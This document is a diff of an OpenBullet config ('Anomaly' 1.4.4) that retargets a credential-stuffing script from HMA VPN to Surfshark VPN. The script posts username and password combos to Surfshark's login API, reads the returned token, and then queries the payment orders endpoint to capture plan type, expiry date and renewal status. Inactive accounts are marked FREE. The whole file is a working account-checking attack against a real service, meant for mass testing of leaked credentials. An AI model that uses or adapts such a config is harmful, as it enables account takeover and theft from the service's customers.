@@ -1,11 +1,11 @@
 [SETTINGS]
 {
-  "Name": "HMA VPN",
+  "Name": "Surfshark VPN",
   "SuggestedBots": 100,
   "MaxCPM": 0,
-  "LastModified": "2020-09-04T17:21:15.2990719+04:30",
+  "LastModified": "2020-09-04T17:32:02.8003279+04:30",
   "AdditionalInfo": "",
-  "Author": "@TheOwn",
+  "Author": "",
   "Version": "1.4.4 [Anomaly]",
   "IgnoreResponseErrors": false,
   "MaxRedirects": 8,
@@ -50,32 +50,41 @@
 }
 
 [SCRIPT]
-#Post REQUEST POST "https://securenetconnection.com/clapi/v1.5/user/login" 
-  CONTENT "username=<USER>&password=<PASS>" 
-  CONTENTTYPE "application/x-www-form-urlencoded" 
+REQUEST POST "https://account.surfshark.com/api/v1/auth/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
   HEADER "Pragma: no-cache" 
   HEADER "Accept: */*" 
+  HEADER "referer: https://account.surfshark.com/login" 
 
 KEYCHECK 
-  KEYCHAIN Failure OR 
-    KEY "Invalid username/password combination" 
   KEYCHAIN Success OR 
-    KEY "\"plan\":" 
-  KEYCHAIN Retry OR 
-    KEY "Error has occurred" 
+    KEY "{\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
 
-#UserName PARSE "<SOURCE>" LR "\"user\":\"" "\"," -> CAP "UserName" 
+PARSE "<SOURCE>" LR "token\":\"" "\",\"" -> VAR "token" 
 
-#Plan PARSE "<SOURCE>" LR "\",\"plan\":\"" "\",\"" -> CAP "Plan" 
-
-#Renew PARSE "<SOURCE>" LR "\",\"expires\":\"" "T" -> CAP "Renew" 
-
-#Data_remaining PARSE "<SOURCE>" LR "\",\"remaining\":" "}}" -> CAP "Data remaining" 
+REQUEST GET "https://account.surfshark.com/api/v1/payment/orders" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "referer: https://account.surfshark.com/" 
 
 KEYCHECK BanOnToCheck=FALSE 
   KEYCHAIN Custom "FREE" OR 
-    KEY "\"plan\":\"\"" 
-    KEY "\"plan\":\"Free Trial\"" 
-    KEY "\",\"expires\":\"1970-01-01" 
+    KEY "<SOURCE>" DoesNotContain "isActive\":true" 
+
+#expiration PARSE "<SOURCE>" LR "subscription\":{\"" "\",\"taxCountry" -> VAR "expiration" 
+
+#Expires_on PARSE "<expiration>" LR "expiresAt\":\"" "T" -> CAP "Expires on" 
+
+#plan PARSE "<SOURCE>" LR "productPlanId\":\"" "frequency\":" -> VAR "plan" 
+
+#Plan_type PARSE "<plan>" LR "name\":\"" "\"," -> CAP "Plan type" 
+
+#Renewable PARSE "<SOURCE>" LR "renewable\":" ",\"" -> CAP "Renewable" 
 
